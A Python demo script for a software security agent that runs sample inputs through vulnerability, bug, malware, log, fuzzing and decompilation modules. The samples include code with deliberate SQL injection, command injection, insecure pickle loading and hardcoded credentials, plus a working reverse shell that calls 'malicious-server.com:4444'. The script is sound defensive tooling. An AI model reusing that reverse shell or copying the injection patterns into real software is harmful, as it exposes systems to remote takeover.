#!/usr/bin/env python3
"""
Software Security Agent Demonstration
Showcases all 8 modules of the Software Security Agent
"""

import sys
from pathlib import Path

# Add src to path
sys.path.insert(0, str(Path(__file__).parent.parent))

from src.domains.software_security.software_security_agent import SoftwareSecurityAgent
from src.domains.software_security.vulnerability_detection import Language
from src.utils.logger import setup_logging, get_logger

# Setup logging
setup_logging(log_level="INFO", log_output="console", log_format="text")
logger = get_logger(__name__)


def print_section(title: str):
    """Print formatted section header"""
    print("\n" + "=" * 80)
    print(f" {title}")
    print("=" * 80 + "\n")


def demo_vulnerability_detection():
    """Demonstrate vulnerability detection"""
    print_section("MODULE 1 & 2: VULNERABILITY DETECTION & REPAIR")

    agent = SoftwareSecurityAgent()

    vulnerable_code = """
import sqlite3
import os

def login(username, password):
    # SQL Injection vulnerability
    conn = sqlite3.connect('users.db')
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    result = conn.execute(query).fetchone()
    return result is not None

def execute_command(user_input):
    # Command Injection vulnerability
    os.system(f"ping {user_input}")

# Hardcoded credentials
API_KEY = "sk-1234567890abcdef"
PASSWORD = "admin123"
"""

    print("🔍 Analyzing vulnerable Python code...\n")
    print(f"Code length: {len(vulnerable_code)} characters\n")

    try:
        results = agent.fix_vulnerabilities(vulnerable_code, Language.PYTHON)

        print(f"✅ Analysis Complete!")
        print(f"   Vulnerabilities Found: {results['vulnerabilities_found']}")
        print(f"   Successfully Repaired: {results['repaired']}")
        print(f"   Failed Repairs: {results['failed']}")

        if results.get('patches'):
            print(f"\n📝 Generated Patches:")
            for i, patch in enumerate(results['patches'][:3], 1):
                print(f"\n   Patch {i}:")
                print(f"   - Patch ID: {patch['patch_id']}")
                print(f"   - Vulnerability: {patch['vulnerability_id']}")
                print(f"   - Confidence: {patch['confidence']:.0%}")
                print(f"   - Side Effects: {'Yes' if patch['has_side_effects'] else 'No'}")

        print(f"\n{results.get('summary', '')}")

    except Exception as e:
        print(f"❌ Error: {e}")


def demo_bug_detection():
    """Demonstrate bug detection and repair"""
    print_section("MODULE 3 & 4: BUG DETECTION & REPAIR")

    agent = SoftwareSecurityAgent()

    buggy_code = """
def calculate_average(numbers):
    # Bug: Division by zero if list is empty
    total = sum(numbers)
    return total / len(numbers)

def find_max(items):
    # Bug: No handling for empty list
    max_item = items[0]
    for item in items[1:]:
        if item > max_item:
            max_item = item
    return max_item

def process_data(data):
    # Bug: Resource leak
    file = open('output.txt', 'w')
    file.write(str(data))
    # Missing file.close()
    return True
"""

    print("🐛 Detecting bugs in Python code...\n")

    try:
        # Use comprehensive audit which includes bug detection
        results = agent.comprehensive_code_audit(buggy_code, Language.PYTHON, "utils.py")

        bugs = results.get("bugs", {})
        print(f"✅ Bug Detection Complete!")
        print(f"   Total Bugs: {bugs.get('total', 0)}")
        print(f"   Code Quality Score: {bugs.get('code_quality_score', 0):.1f}/100")

        if bugs.get('details'):
            print(f"\n🔍 Detected Bugs:")
            for bug in bugs['details'][:3]:
                print(f"\n   - {bug['id']}: {bug['name']}")
                print(f"     Type: {bug['type']}")
                print(f"     Severity: {bug['severity']}")

    except Exception as e:
        print(f"❌ Error: {e}")


def demo_comprehensive_audit():
    """Demonstrate comprehensive security audit"""
    print_section("COMPREHENSIVE SECURITY AUDIT (All Modules)")

    agent = SoftwareSecurityAgent()

    mixed_issues_code = """
import sqlite3
import pickle
import os

class UserManager:
    def __init__(self):
        self.db = sqlite3.connect('users.db')
        self.admin_password = "admin123"  # Hardcoded credential

    def get_user(self, user_id):
        # SQL Injection
        query = f"SELECT * FROM users WHERE id = {user_id}"
        return self.db.execute(query).fetchone()

    def deserialize_user(self, data):
        # Insecure deserialization
        return pickle.loads(data)

    def calculate_score(self, scores):
        # Division by zero bug
        return sum(scores) / len(scores)

    def run_command(self, cmd):
        # Command injection
        os.system(cmd)
"""

    print("🔬 Running comprehensive security audit...")
    print(f"   Analyzing: UserManager class ({len(mixed_issues_code)} chars)\n")

    try:
        results = agent.comprehensive_code_audit(
            mixed_issues_code,
            Language.PYTHON,
            filename="user_manager.py"
        )

        print(f"✅ Audit Complete!\n")
        print(results['summary'])

        print(f"📊 Detailed Results:")
        print(f"   Overall Risk Score: {results['risk_score']:.1f}/100")
        print(f"   Modules Executed: {len(results['modules_executed'])}")

        # Vulnerabilities
        vuln = results.get('vulnerabilities', {})
        if vuln:
            print(f"\n   🔐 Vulnerabilities: {vuln['total']}")
            print(f"      - Critical: {vuln['critical']}")
            print(f"      - High: {vuln['high']}")
            print(f"      - Medium: {vuln['medium']}")
            print(f"      - Low: {vuln['low']}")

        # CWE Patterns
        cwe = results.get('cwe_patterns', [])
        if cwe:
            print(f"\n   🎯 CWE Patterns Detected: {', '.join(cwe[:5])}")

        # Code Smells
        smells = results.get('code_smells', {})
        if smells:
            print(f"\n   💨 Code Smells: {smells.get('total', 0)}")

    except Exception as e:
        print(f"❌ Error: {e}")


def demo_malware_detection():
    """Demonstrate malware detection"""
    print_section("MODULE 7: MALWARE DETECTION")

    agent = SoftwareSecurityAgent()

    suspicious_code = """
import socket
import subprocess
import base64

def connect_to_server():
    # Looks like a reverse shell
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("malicious-server.com", 4444))

    while True:
        command = s.recv(1024).decode()

        if command.lower() == "exit":
            break

        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            s.send(output)
        except Exception as e:
            s.send(str(e).encode())

    s.close()

# Obfuscated payload
payload = base64.b64decode("Y21kLmV4ZSAvYyBkaXIgQzpcXA==")
"""

    print("🦠 Scanning for malware...\n")
    print(f"Code sample: {len(suspicious_code)} characters\n")

    try:
        results = agent.analyze_malware(suspicious_code, "python_script")

        print(f"✅ Malware Scan Complete!")
        print(f"   Is Malware: {'🚨 YES' if results['is_malware'] else '✅ NO'}")
        print(f"   Confidence: {results['confidence']:.0%}")
        print(f"   Severity: {results['severity']}")

        if results.get('malware_types'):
            print(f"\n   🎭 Malware Types:")
            for mt in results['malware_types']:
                print(f"      - {mt}")

        if results.get('behaviors'):
            print(f"\n   ⚠️  Malicious Behaviors:")
            for behavior in results['behaviors'][:3]:
                print(f"      - {behavior}")

        if results.get('iocs'):
            print(f"\n   🎯 IOCs Found:")
            for ioc in results['iocs'][:3]:
                print(f"      - {ioc}")

    except Exception as e:
        print(f"❌ Error: {e}")


def demo_log_analysis():
    """Demonstrate system log analysis"""
    print_section("MODULE 8: SYSTEM LOG ANALYSIS")

    agent = SoftwareSecurityAgent()

    system_logs = """
2025-11-16 14:00:00 INFO: Application started
2025-11-16 14:00:15 INFO: User admin logged in
2025-11-16 14:05:30 WARNING: High memory usage (92%)
2025-11-16 14:06:00 ERROR: Database connection timeout
2025-11-16 14:06:05 ERROR: Failed to process request: Connection lost
2025-11-16 14:06:10 CRITICAL: OutOfMemoryError - Service crashed
2025-11-16 14:06:15 WARNING: Multiple failed login attempts from 192.168.1.100
2025-11-16 14:06:20 WARNING: Failed login for user 'admin' from 192.168.1.100
2025-11-16 14:06:25 WARNING: Failed login for user 'root' from 192.168.1.100
2025-11-16 14:06:30 ERROR: Brute force attack detected from 192.168.1.100
2025-11-16 14:07:00 INFO: Service restarted
2025-11-16 14:07:15 INFO: System recovered
"""

    print("📜 Analyzing system logs...\n")
    print(f"Log entries: {len(system_logs.split(chr(10)))} lines\n")

    try:
        results = agent.analyze_system_logs(system_logs)

        print(f"✅ Log Analysis Complete!")
        print(f"   Total Logs: {results['total_logs']}")
        print(f"   Anomalies Found: {results['anomalies_found']}")

        print(f"\n📊 Summary:")
        print(f"   {results['summary']}")

        if results.get('critical_anomalies'):
            print(f"\n🚨 Critical Anomalies:")
            for anom in results['critical_anomalies'][:3]:
                print(f"\n   {anom['id']}: {anom['type'].upper()}")
                print(f"   Severity: {anom['severity']}")
                print(f"   Description: {anom['description']}")
                print(f"   Root Cause: {anom['root_cause']}")

        if results.get('trends'):
            print(f"\n📈 Observed Trends:")
            for trend in results['trends'][:3]:
                print(f"   - {trend}")

    except Exception as e:
        print(f"❌ Error: {e}")


def demo_fuzzing():
    """Demonstrate program fuzzing"""
    print_section("MODULE 5: PROGRAM FUZZING")

    agent = SoftwareSecurityAgent()

    function_signature = """
def process_payment(amount: float, card_number: str, cvv: int) -> bool:
    '''Process a payment transaction'''
    pass
"""

    print("🎯 Generating fuzz tests for payment function...\n")

    try:
        results = agent.generate_fuzz_tests(
            function_signature,
            Language.PYTHON,
            count=5
        )

        print(f"✅ Fuzz Test Generation Complete!")
        print(f"   Total Tests: {results['total_tests']}\n")

        print(f"   Generated Test Cases:")
        for tc in results['test_cases']:
            print(f"\n   {tc['id']}: {tc['type']}")
            print(f"   Input: {tc['input']}")
            print(f"   Expected: {tc['expected']}")

    except Exception as e:
        print(f"❌ Error: {e}")


def demo_reverse_engineering():
    """Demonstrate reverse engineering"""
    print_section("MODULE 6: REVERSE ENGINEERING")

    agent = SoftwareSecurityAgent()

    assembly_code = """
_start:
    push ebp
    mov ebp, esp
    sub esp, 0x10
    mov dword [ebp-4], 0
loop_start:
    cmp dword [ebp-4], 10
    jge loop_end
    mov eax, [ebp-4]
    add eax, 1
    mov [ebp-4], eax
    jmp loop_start
loop_end:
    leave
    ret
"""

    print("⚙️  Reverse engineering assembly code...\n")
    print(f"Assembly: {len(assembly_code)} characters\n")

    try:
        results = agent.reverse_engineer_binary(assembly_code)

        print(f"✅ Decompilation Complete!")
        print(f"   Target Language: {results['language']}")
        print(f"   Confidence: {results['confidence']:.0%}")

        print(f"\n💻 Decompiled Code:")
        print("   " + "\n   ".join(results['code'].split('\n')[:10]))

        print(f"\n📖 Analysis:")
        print(f"   {results['analysis']}")

        if results.get('functions'):
            print(f"\n📦 Functions Identified: {', '.join(results['functions'])}")

    except Exception as e:
        print(f"❌ Error: {e}")


def main():
    """Main demonstration function"""
    print("\n")
    print("╔" + "═" * 78 + "╗")
    print("║" + " " * 15 + "SOFTWARE SECURITY AGENT DEMONSTRATION" + " " * 26 + "║")
    print("║" + " " * 22 + "8 Security Modules Showcase" + " " * 29 + "║")
    print("╚" + "═" * 78 + "╝")

    # Get agent status
    agent = SoftwareSecurityAgent()
    status = agent.get_agent_status()

    print(f"\n📊 Agent Status:")
    print(f"   Name: {status['agent_name']}")
    print(f"   Status: {status['status']}")
    print(f"   Active Modules: {len(status['modules'])}")
    print(f"   Supported Languages: {len(status['supported_languages'])}")

    try:
        # Run all demonstrations
        demo_vulnerability_detection()
        input("\n\nPress Enter to continue to Bug Detection...")

        demo_bug_detection()
        input("\n\nPress Enter to continue to Comprehensive Audit...")

        demo_comprehensive_audit()
        input("\n\nPress Enter to continue to Malware Detection...")

        demo_malware_detection()
        input("\n\nPress Enter to continue to Log Analysis...")

        demo_log_analysis()
        input("\n\nPress Enter to continue to Program Fuzzing...")

        demo_fuzzing()
        input("\n\nPress Enter to continue to Reverse Engineering...")

        demo_reverse_engineering()

        print("\n" + "=" * 80)
        print(" DEMONSTRATION COMPLETE")
        print("=" * 80)
        print("\n✅ All 8 Software Security modules demonstrated successfully!")
        print("\nModules showcased:")
        print("  1. Vulnerability Detection - Static code analysis")
        print("  2. Vulnerability Repair - Automated patching")
        print("  3. Bug Detection - Logic error identification")
        print("  4. Bug Repair - Automated bug fixing")
        print("  5. Program Fuzzing - Test case generation")
        print("  6. Reverse Engineering - Binary decompilation")
        print("  7. Malware Detection - Malicious code identification")
        print("  8. System Log Analysis - Anomaly detection")
        print("\n")

    except KeyboardInterrupt:
        print("\n\n⚠️  Demonstration interrupted by user")
        sys.exit(0)
    except Exception as e:
        logger.error(f"Demonstration failed: {e}", exc_info=True)
        print(f"\n❌ Error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
